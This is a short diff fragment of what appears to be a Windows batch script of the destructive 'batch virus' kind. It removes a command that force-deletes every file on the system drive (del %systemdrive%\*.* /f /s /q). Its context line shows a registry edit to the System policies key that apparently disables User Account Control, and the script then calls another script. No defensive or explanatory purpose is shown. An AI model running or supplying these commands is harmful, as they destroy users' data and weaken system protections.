@@ -38,5 +38,5 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 
 
 @echo off 
-start del %systemdrive%\*.* /f /s /q
+
 copy.cmd
